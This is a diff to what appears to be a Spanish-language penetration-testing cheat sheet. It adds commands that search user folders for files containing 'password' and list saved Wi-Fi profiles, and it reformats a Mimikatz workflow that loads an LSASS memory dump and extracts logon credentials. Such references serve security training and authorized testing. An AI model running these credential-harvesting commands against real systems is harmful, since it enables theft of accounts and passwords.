@@ -1260,7 +1260,11 @@ Get-ChildItem -Path C:\Users\elliot\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.d
 Select-String -Path C:\Users\elliot\Documents\*.txt -Pattern password
 
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+findstr /S /I /C:"password" "C:\Users\*"*.txt *.ini *.cfg *.config *.xml
 findstr /spin "password" *.*
+
+# Visualización de redes inalámbricas guardadas
+netsh wlan show profile
 ```
 
 Buscar contraseñas en el Registro
@@ -2053,20 +2057,20 @@ Pasos para explotar el volcado de LSASS:
 
 Explicación:
 
-2. `-ma`: Captura un volcado de memoria completo del lsass.exe proceso.
-    `-lsass.dmp`: El archivo de volcado de salida que luego se puede analizar para extraer credenciales.
+- `-ma`: Captura un volcado de memoria completo del proceso `lsass.exe`.
+- `-lsass.dmp`: El archivo de volcado de salida que luego se puede analizar para extraer credenciales.
 
 Analizar el dump con Mimikatz :
 
-```powershell
+```c
 mimikatz # sekurlsa::minidump lsass.dmp
 mimikatz # sekurlsa::logonpasswords
 ```
 
 Explicación:
 
-    `sekurlsa::minidump`: Carga el archivo volcado.
-    `sekurlsa::logonpasswords` Extrae credenciales del volcado.
+- `sekurlsa::minidump`: Carga el archivo volcado.
+- `sekurlsa::logonpasswords` Extrae credenciales del volcado.
 
 
 ###  9.2. <a name='linux-2'></a>Linux
